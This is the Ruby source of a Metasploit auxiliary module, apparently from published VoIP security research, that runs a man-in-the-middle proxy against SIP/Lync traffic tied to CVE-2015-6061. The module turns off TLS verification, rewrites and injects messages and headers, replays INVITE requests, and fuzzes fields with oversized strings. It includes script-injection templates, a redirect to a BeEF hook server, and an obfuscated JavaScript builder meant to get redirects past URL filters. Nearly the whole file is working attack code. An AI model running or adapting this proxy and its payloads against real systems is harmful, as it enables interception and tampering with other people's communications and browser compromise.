##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::TcpServer

  def initialize(info = {})
    super(
      'Name'           => 'Viproxy MITM proxy',
      'Version'        => '1',
      'Description'    => 'Viproxy VoIP MITM proxy with TCP/TLS support.',
      'License'        => 'GPL',
      'Actions'     =>
        [
          [ 'Service' ]
        ],
      'PassiveActions' =>
        [
          'Service'
        ],
      'DefaultAction'  => 'Service',
      'Author'         => 'fozavci', # viproy.com/fozavci
      'References'     =>
              [
                 ['MSB', 'MS15-123'],
                 ['CVE', '2015-6061' ],
                 ['URL', 'https://www.senseofsecurity.com.au/sitecontnt/uploads/2015/11/SOS-15-005.pdf'], # Vulnerabilities and exploits
                 ['URL', 'https://www.senseofsecurity.com.au/sitecontnt/uploads/2015/11/SOS-15-005-BH-EU-15-Ozavci-VoIP-Wars-Destroying-Jar-Jar-Lync.pdf'], # Presentation
              ],
    )

    register_options(
      [
          OptString.new('RHOST', [ true, "Destination IP Address", nil]),
          OptString.new('RPORT', [ true, "Destination Port", nil]),
          OptBool.new('SSL', [ false, 'Negotiate SSL for proxy connections', false]),
          OptString.new('LOGFILE', [ false, "Log file for content"]),
          OptPath.new('REPLACEFILE', [ false, "File containing the replacements"]),

      ], self.class)
  end

  def setup
    super
    # Variables
    @logfname           = datastore['LOGFILE']
    @connected_backends = {}
    @monitoringthreads  = {}
    @errors             = {}
    @command_sockets    = {}
    @subject_table      = {}
    $header_table       = []
    $headertoremove_table = []
    $endpoints          = ""
    $content_length_update = true
    @recorded_requests  = {}
    @recording_cont     = false
    
    replacement_vars
    message_vars
    attack_messages

    
    # Loading the replacements
    set_replacefile(datastore['REPLACEFILE']) if datastore['REPLACEFILE']
  end
  
  # Message variables
  def message_vars
     $message_table = {}
     $message_table["BCK"] = {}
     $message_table["CLI"] = {}
  end
  
  # Replacement variables
  def replacement_vars
     $replacement_table  = {}
     $replacement_table["BCK"] = {}
     $replacement_table["CLI"] = {}
  end

  def run
     start_service

     # Wait for the service    
     while service
        Rex::ThreadSafe.sleep(0.5)
     end
     
     stop_service
  end

  #Handling the client connections
  def on_client_connect(c)
    begin
      # handle the client
      vprint_status("#{c.peerhost}:#{c.peerport} is connected.")
            
      # connect to the backend
      connect_to_backend(c)
      
      # start monitoring on the backend IO
      vprint_status("Monitoring thread is calling for #{c.peerhost}")
      monitoring_thread(c)
      
      # recieve data from the client
      on_client_data(c)
    rescue ::Exception => e
      print_error(e.message)
    end
    
  end
  

  # Starting a monitoring thread
  def monitoring_thread(c)
      @monitoringthreads[c] = framework.threads.spawn("Monitor #{c.peerhost}:#{c.peerport}", false) {
            monitor_socket(c)
      }   
  end
              
  
  
  # Getting a backend socket
  def get_backend_sock
     sock = Rex::Socket::Tcp.create(
                'PeerHost'       => datastore['RHOST'],
                'PeerPort'       => datastore['RPORT'],
                'SSL'            => datastore['SSL'],
                'SSLVerifyMode'  => 'NONE',
            )
      return sock
  end
  
  # Connect to the backend service
  def connect_to_backend(c)
     @errors[c] = 0
      begin
         @connected_backends[c] = get_backend_sock
         vprint_status("The remote backend socket is connected for #{c.peerhost}:#{c.peerport}.")
      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE => e
         print_error("The remote backend socket couldn't be connected: #{e.message}")
      end  
  end


  # Monitor for the backend socket
  def monitor_socket(c)
   vprint_status("Monitor is starting for #{c.peerhost}")

   if @connected_backends[c].nil? or @connected_backends[c].closed?
      s = @connected_backends[c] = get_backend_sock
   else
      s = @connected_backends[c]
   end

   begin
         while ! (c.closed? or s.closed?)
         	rds = [s]
         	wds = []
         	eds = [s]
         	r,w,e = ::IO.select(rds,wds,eds,1)
         	if (r != nil and r[0] == s)
         		buf = s.read(10000)
               if ! buf.nil?
                  vprint_status("Data received from the backend:\n#{buf}")
                  # Search and replace point for the backend
                  buf = update_message(buf,"BCK") if $headertoremove_table != [] or $message_table["BCK"] != {} or $replacement_table["BCK"] != {}
                  # Compression should be disabled
                  buf.gsub!("Compression: LZ77-8K","Compression: None")
                  logwrite(buf,"#{s.peerhost}:#{s.peerport}") if ! @logfname.nil?                    
            		c.write(buf)
               end
         	end
         end
      	vprint_status('Monitor is stoping')      
         c.close
         s.close
    rescue IOError, ::Rex::ECONNRESET, ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE => e
       print_error("The remote backend socket is terminated with \"#{e.message}\"")
       @connected_backends[c] = nil
    rescue ::Exception => e
       print_error("Monitor error occoured for #{c.peerhost} => #{e.message}")
       clear_sessions(c)
    end
  end
  
  # Command socket banner
  def command_help
     msg =  "Command socket is enabled, please use commands as below:\n\n"
     msg << "REPLACE|CLI|contenttofind|contenttoreplace\n"
     msg << "INVITESUBJECT|<script>window.location=\"http://www.google.com\"</script>\n"
     msg << "MESSAGE|CLI|find123|text/html|content\n"
     msg << "MESSAGE|CLI|find123|template1\n"
     msg << "FLUSHMESSAGES\n"
     msg << "FLUSHREPLACES\n"
     msg << "FLUSHSUBJECT\n\n"

     return msg
  end
  
  # Request parsing to create templates
  def req_parsing(buf)

     
     vprint_status("Request parsing is starting\n#{buf}")
     if buf.nil? 
        vprint_status("Request parsing is finished: Request is nil or starts with \\r or \\n") 
        return 
     else
        vprint_status("Case will be starting")        
     end
     
     reqtype = buf.split(" ")[0]
     
     if @recording_cont != false
        vprint_status("Request continued is detected")  
        @recorded_requests[@recording_cont.split("|")[0]] << buf 
        if buf.length < @recording_cont.split("|")[1].to_i
           @recording_cont = "#{reqtype}|#{@recording_cont.split("|")[1].to_i-buf.length}"
           vprint_status("Recording is open for #{reqtype}|#{@recording_cont.split("|")[1].to_i-buf.length} chars!")
        else
           @recording_cont = false
        end
        return
     end
     
     case reqtype
     when /BENOTIFY|BYE|ACK|OPTIONS|NEGOTIATE|NOTIFY|REGISTER|SIP|SERVICE|SUBSCRIBE|PHRACK/
        vprint_status("Request type is not getting recorded : #{reqtype}")
     when /INVITE|MESSAGE/
        vprint_status("Request type #{reqtype} is getting recorded.")
        # clonning the original headers in case of updates
        if(buf =~ /^Content-Length:\s+(.*)$/)
           parsed_cl = $1.strip.to_i
           vprint_status("Content Length parsed is #{parsed_cl}")
        end
        
        reqcontentlength=buf.split("\r\n\r\n")[1..1000].join("\r\n\r\n").length
        
        vprint_status("Content Length calculated is #{reqcontentlength}")
        
        if reqcontentlength < parsed_cl
           @recording_cont = "#{reqtype}|#{parsed_cl-reqcontentlength}"
           vprint_status("Recording is open for #{reqtype}|#{parsed_cl-reqcontentlength}")
        end
        
        @recorded_requests[reqtype] = buf
        vprint_status("Content is recorded.")
     else
        vprint_status("Request is continuing...")
     end
     vprint_status("Request parsing is finished")
     return
  end
  
  # Handle the data from the client
  def on_client_data(c)
     if @connected_backends[c].nil? or @connected_backends[c].closed?
        monitoring_thread(c) 
        Rex::ThreadSafe.sleep(1)
     end
          
     begin
        buf=c.read(10000)
        return if buf.nil?
        vprint_status("Debugging the split error...")
        # Compression should be disabled
        buf.gsub!("Compression: LZ77-8K","Compression: None")
        process_client_data(c,buf)
        vprint_status("Data is parsed.")
        
     rescue Errno::EPIPE => e
        print_error("The remote backend socket is terminated with \"#{e.message}\"")
        vprint_status("The client connection is also terminating, the last data from the client:\n#{buf}")
        clear_sessions(c)
        # killing the threads
        @monitoringthreads.each {|c,t| t.kill}
     rescue ::Exception => e
        print_error("Client data recieved, but an error occoured #{c.peerhost}:#{c.peerport} => #{e.message}") 
        print_error("Client socket #{c}")
        print_error("Backend socket #{@connected_backends[c]}")
        print_error("Backend status #{@connected_backends[c].closed?}")
        print_error("Client status #{c.closed?}")
        clear_sessions(c)
        # killing the threads
        @monitoringthreads.each {|c,t| t.kill}
     end
  end
  
  def process_client_data(c,buf)
     if ! @connected_backends[c].nil? and ! @connected_backends[c].closed? 
        
        if buf =~ /^(V|v)iproxy/ or @command_sockets[c] == true
           if @command_sockets[c].nil?
              c.write(command_help)
              @command_sockets[c] = true
           else
              print_status("Command received from the command console!")
              viproxy_command(c,buf)
           end
        else           
           vprint_status("This is a VoIP client!")
           vprint_status("Data recieved:\n#{buf}")
           
           # Parser is calling to capture samples
           vprint_status("Parser is calling to capture samples!")
           
           req_parsing(buf)
           
           # Subject updates
           vprint_status("Subject updates!")
           buf = update_subject(buf) if @subject_table != {}
           
           # Search and replace point for the client
           vprint_status("Search and replace point for the client!")
           buf = update_message(buf,"CLI") if $header_table != [] or $message_table["CLI"] != {} or $replacement_table["CLI"] != {}
           
           logwrite(buf,"#{c.peerhost}:#{c.peerport}") if ! @logfname.nil?                    
           vprint_status("Data is redirecting to the backend.")
           @connected_backends[c].write(buf)
           vprint_status("Data is redirected to the backend.")
           vprint_status("Data processed successfully!")
           
        end
     else
        vprint_status("#{c.peerhost}:#{c.peerport} is connected, but sending no data.")
        Rex::ThreadSafe.sleep(2)
        if @errors[c] > 1
           print_status("Due to the inactivity, the backend monitor is stoping for #{c.peerhost}:#{c.peerport}.")
           clear_sessions(c)
           @errors[c] = 0
        else
           @errors[c] += 1
        end
        if c.closed? or @connected_backends[c].nil? or @connected_backends[c].closed? 
           vprint_status("Monitor thread is stopping for #{c.peerhost}:#{c.peerport}")
           clear_sessions(c)
        end
     end
  end
  
  # Handling the Viproxy commands
  def viproxy_command(c,command)
     @monitoringthreads[c].kill if @monitoringthreads[c].alive?
     return if command.nil? or command == "\n"
     print_status("Command recieved from the console:\n#{command}")
     begin
        case command.split("|")[0].upcase
        when /^ENDPOINTS/
           begin
              fix1   = command.split("|")[1]
              start  = command.split("|")[2].to_i
              t      = command.split("|")[3].to_i
              fix2   = command.split("|")[4].chop
              ep     = "Endpoints:"
              t.times {|i|
                 ep << " <#{fix1}#{start+i}#{fix2}>,"
              }
              $header_table << ep.chop
              c.write("\nEndpoints are added to the headers table.\n#{ep}\n")
           rescue
              c.write("Endpoint definition couldn't parse! Define the endpoints like the following;\nENDPOINTS|fix1|startnumber|countforloop|fix2\n\n")
           end
        when /^PRINTINVITE/
           if @recorded_requests["INVITE"]
              c.write("The last INVITE recorded:\n#{@recorded_requests["INVITE"]}\n") 
           else
              c.write("No recorded INVITE detected.\n")
           end
        when /^RESENDINVITE/
           if @recorded_requests["INVITE"]
              c.write("The last INVITE is resending.\n") 
              msg = @recorded_requests["INVITE"]
              msg.gsub!()
              @connected_backends[c].write(msg)
              c.write("The last INVITE resent.\n") 
           else
              c.write("No recorded INVITE detected.\n")
           end
        when /^PRINTMESSAGE/
           if @recorded_requests["MESSAGE"]
              c.write("The last MESSAGE recorded:\n#{@recorded_requests["MESSAGE"]}\n") 
           else
              c.write("No recorded MESSAGE detected.\n")
           end
        when /^FLUSHHEADERS/
           $header_table = []
           $headertoremove_table = []
           c.write("Custom headers are cleaned.\n\n")
        when /^REMOVEHEADER/
           hremove = Regexp.new command.split("|")[1].chop
           $headertoremove_table << hremove
           c.write("Header to be removed is added.\t#{hremove}\n\n")
        when /^PRINTHEADERS/
           c.write("Custom headers in progress.\n")
           $header_table.each {|h| c.write("#{h}\n")}
           c.write("\n")
        when /^PRINTREPLACES/
           c.write("Replacements in progress.\n")
           $replacement_table.each {|d,table|
              c.write("#{d} replacements:\n")
              table.each {|r,str|
                 c.write("#{r} => #{str}\n")
              }
           }
           c.write("\n")
        when /^REPLACEFILE/
           f = command.split("|")[1].chop
           c.write("Replace file is loading.\n\n")           
           set_replacefile(f)
        when /^FLUSHSUBJECT/
           @subject_table = {}
           c.write("Subject changing is disabled.\n\n")
        when /^FLUSHREPLACES/
           replacement_vars
           c.write("Replacemet table is cleaned.\n")
        when /^FLUSHMESSAGES/
           message_vars
           c.write("Message table is cleaned.\n")
        when /^REPLACE/
           d = command.split("|")[1]
           s = command.split("|")[2]
           v = command.split("|")[3..1000].join("|")
           v = simplefuzz(v) if v =~ /FUZZ/
           v.chop! if v[v.length-1] == "\n"           
           
           print_status("Replacement update is calling for #{s} => #{v}\n\n")
           msg=update_replaces(d,s,v)
           vprint_status(msg)
           c.write(msg)
        when /^CLUPDATE/
           cu = command.split("|")[1]
           case cu 
           when /true/
              $content_length_update = true
              c.write("Content-Length update is enabled.\n")
           when /false/
              $content_length_update = false
              c.write("Content-Length update is disabled.\n")
           else
              c.write("Use CLUPDATE|true or CLUPDATE|false\n")
           end
        when /^MESSAGE/
           d = command.split("|")[1]
           s = Regexp.new command.split("|")[2]
           mraw = command.split("|")[3].gsub("\n","")
           if @attack_messages[mraw]
              mtype,m = @attack_messages[mraw]
           else 
              mtype   = command.split("|")[3]
              m = command.split("|")[4..1000].join("|")
              m.chop! if m[m.length-1] == "\n"   
           end  
                    
           print_status("Message is #{mtype} => #{m}")
           
           # message table is updating
           if d == "BOTH"
               $message_table["CLI"][s] = [mtype,m]
               $message_table["BCK"][s] = [mtype,m]
            else
               $message_table[d][s] = [mtype,m]
            end
           vprint_status("Message table is updated.\n\n")
           c.write("Message table is updated #{$message_table}.\n\n")
        when /^BYPASSURLFILTER/
           d = command.split("|")[1]
           s = Regexp.new command.split("|")[2]
           
           mtype = "text/html"
           url = command.split("|")[3].gsub("\n","")
           if url.split(".")[0] == "www"
              sc = 'o="w"; k="."; i=""; u4=i.concat(o,o,o,k)'
              sc = 'o="w"; k="."; i=""; u4=i.concat(o,o,o,k)'
              url=url.split(".")[1..1000].join(".")
           else
              sc = 'u4=""'
           end
           m='<script>var u1="ht"; u2="tp"; u3="://";'+sc+'; window.location=u1+u2+u3+u4+"'+url+'"</script>'
           
           print_status("Message is #{mtype} => #{m}")
           
           # message table is updating
           if d == "BOTH"
               $message_table["CLI"][s] = [mtype,m]
               $message_table["BCK"][s] = [mtype,m]
            else
               $message_table[d][s] = [mtype,m]
            end
           vprint_status("Message table is updated.\n\n")
           c.write("Message table is updated #{$message_table}.\n\n")
        when /^INVITESUBJECT/
           s = command.split("|")[1].gsub("\n","")
           
           s = simplefuzz(s) if s =~ /FUZZ/
           
           stext,shtml,srtf = subject_prep(s)
           c.write("Subject changing is in progress.\n\n")
           @subject_table = {
              "stext" => stext,
              "shtml" => shtml,
              "srtf"  => srtf
           }
        when /^CUSTOMHEADER/
           header = command.split("|")[1].chop
           header = simplefuzz(header) if header =~ /FUZZ/
           $header_table << header
           c.write("Header is added.\n#{header}\n\n")
        else
           c.write("Command not found.\n")
        end
     rescue ::Exception => e
        c.write("Command couldn't be parsed, the command separator is | #{e}\n\n")
        c.write(command_help)
        print_error("Command couldn't be parsed, the command separator is |\n\n")
     end
  end
  
  # Simple fuzzing
  def simplefuzz(buf)
     head   = buf.split("FUZZ ")[0]              
     count  = buf.split("FUZZ ")[1].split(" ")[0].to_i
     value  = "A" * count               
     buf.gsub!("FUZZ #{count}",value)
     return buf
  end
  
  # subject preparation
  def subject_prep(s)
     vprint_status("Subject preparation for #{s}")
     srtf = "{\\rtf1\\ansi\\ansicpg1252\\cocoartf1348\\cocoasubrtf170\n"
     srtf << "\\cocoascreenfonts1{\\fonttbl\\f0\\fnil\\fcharset0 LucidaGrande;}\n"
     srtf << "{\\colortbl;\\red255\\green255\\blue255;\\red0\\green0\\blue0;}\n"
     srtf << "\\deftab720\n"
     srtf << "\\pard\\pardeftab720\n\n"
     srtf << "\\f0\\fs20 \\cf2 \\expnd0\\expndtw0\\kerning0"
     srtf << "\\outl0\\strokewidth0 \\strokec2 #{s}}"
     
     stext = Rex::Text.encode_base64(s, delim='')
     shtml = Rex::Text.encode_base64(s, delim='')
     srtf = Rex::Text.encode_base64(srtf, delim='')
     return stext,shtml,srtf
  end
  
  # Sample attack messages
  def attack_messages
     @attack_messages= {
        "template1" => ["text/html", "<h1>Hello Viproxy!</h1>"],
        "template2" => ["text/html", "<script>alert('Hello Viproxy!')</script>"],
        "template3" => ["text/html", "<script>window.location=\"http://www.senseofsecurity.com.au\"</script>"],
        "template4" => ["text/plain", "sample text message"],
        "template5" => ["text/#{"A"*4000}", "Bogus content type"],
        "template6" => ["#{"A"*40000}/plain", "Bogus content type 2"],
        "templatebeef" => ["text/html", "<script>window.location=\"http://1.2.3.4:3000/demos/basic.html\"</script>"],
     }
  end
  
  # Invite subject update
  def update_subject(buf)
     newbuf = ""
     buf.split("\r\n").each { |h|
       case h 
       when /^Ms-Text-Format/
          #newbuf << "Ms-Text-Format: text/plain; charset=UTF-8; ms-body=#{@subject_table["stext"]}"+"\r\n"
          #newbuf << "Ms-Text-Format: text/plain; charset=UTF-8; ms-body=SGVsbG8h"+"\r\n"
       when /^Ms-IM-Format: text\/html;/
          newbuf << "Ms-IM-Format: text/html; charset=UTF-8; ms-body=#{@subject_table["stext"]}"+"\r\n"
          #newbuf << "Ms-IM-Format: application/x-vbscript; charset=UTF-8; ms-body=#{vbs_exploit}"+"\r\n"
       when /^Ms-IM-Format: text\/rtf;/
          #newbuf << "Ms-IM-Format: text/rtf; charset=UTF-8; ms-body=#{@subject_table["srtf"]}"+"\r\n"
       else
          newbuf << h+"\r\n"
       end
     }
     
     vprint_status("Subject is updated:\n#{newbuf}")
     return newbuf
  end
  
  # Message content update 
  def update_message(buf,d)
     return buf if buf.nil? or buf.split("\r\n\r\n")[0].nil? or buf == /^\r|\n/ 
     
     vprint_status("Message update is called...")
     
     orghed = buf.split("\r\n\r\n")[0]
     if buf.split("\r\n\r\n")[1] != nil
        content = buf.split("\r\n\r\n")[1..1000].join("\r\n")  
     else
        content = nil
     end
     
     vprint_status("Parsed content:\n#{content}")
     
     headers   = ""
     ct        = ""
     parsed_cl = 0
     
     # clonning the original headers in case of updates
     orghed.split("\r\n").each { |h|
       case h 
       when /^Content-Length/
          parsed_cl = h.split(" ")[1]
       when /^Endpoints/
          headers << $endpoints if ! ($header_table.to_s =~ /Endpoints/)        
       when /^Content-Type/
          ct = h.split(" ")[1]
       when $headertoremove_table != []
          # removing the headers 
          $headertoremove_table.each {|hremove|
             print_status("#{hremove} will be removed")
             headers << h+"\r\n" if ! h =~ hremove
          }
       else
          headers << h+"\r\n"
       end
     }

     # adding the custom headers
     $header_table.each {|h|
        headers << h+"\r\n"
     }
     
     # replacements are executing for the headers
     $replacement_table[d].each { |r,x|
        vprint_status("Replacement is for #{r}")
        headers = headers.gsub(r,x)
        content = content.gsub(r,x) if content != nil
     } 
     
     # custom message contents are executing for the content
     $message_table[d].each { |r,x|
        if content =~ r
           ct = x[0]
           content = x[1]
           break
        end
     } 
     
      
      # setting the content length to 0 for nil
      case
         when $content_length_update == false
            cl = parsed_cl 
         when content == nil
            cl = 0
      else
         cl = content.length
      end
      
      # the message is reassembling 
      msg = headers
      msg << "Content-Length: #{cl}\r\n"
      msg << "Content-Type: #{ct}\r\n" if ct != ""
      msg << "\r\n" 
      msg << content if content != nil

      vprint_status("Message prepared: \n#{msg}")
      return msg
  end 
  
  # Updating the replacements
  def update_replaces(type,r,content)     
     # updating the fuzz content
     if content =~ /FUZZ/
       str = simplefuzz(content)
     else
       str = content
     end
     
     # defining the content for the type
     case type
        when /BOTH/
            $replacement_table["BCK"][r] = str
            $replacement_table["CLI"][r] = str
        when /BCK|CLI/
            $replacement_table[type][r] = str
     else
        return "Error: type is unknown, please use BCK, CLI or BOTH." 
     end
     
     msg="Replacement table is updated for #{type}.\n\n"
  end
  
  def clear_sessions(c)
     if ! c.nil?
        @connected_backends[c].close if @connected_backends[c] != nil
        c.close 
        @connected_backends[c] = nil
        @monitoringthreads[c].kill
     end
  end

  # Disconnect backend connections
  def on_client_close(c)
    clear_sessions(c)
    vprint_status("Backend connections are closed")
  end
  

  def set_replacefile(f)
      print_status("Replacement file is "+f.to_s)
      contents=IO.read(f)
      
      contents.split("\n").each { |line|
         # reading the lines
         next if line =~ /^#/
         type=line.split("|")[0]
         t = line.split("|")[1]
         next if t.nil?
         r = Regexp.new t
         c = line.split("|")[2..1000].join("|")
         c.chop! if c[c.length-1] == "\n"
         
         # loading the fuzz content
         if c =~ /FUZZ/
           str = "A" * c.split(" ")[1].to_i
           vprint_status(str)
         else
           str = c
           vprint_status("#{r} to #{str}")
         end

         # defining the content for the type
         if type == "BOTH"
             $replacement_table["BCK"][r] = str
             $replacement_table["CLI"][r] = str
         else
             $replacement_table[type][r] = str
         end
       }
  end

  def logwrite(buf,src)
    begin
      logfile = File.new(@logfname,'a')
      vprint_status("Logging to #{@logfname}")
      logfile.write "------------------#{src}------------------\n"
      logfile.write buf+"\n\n"
    rescue ::Errno::EPIPE => e
      print_error(e.message)
    ensure
      logfile.close
    end
    vprint_status("Logged to #{@logfname}")
  end

end
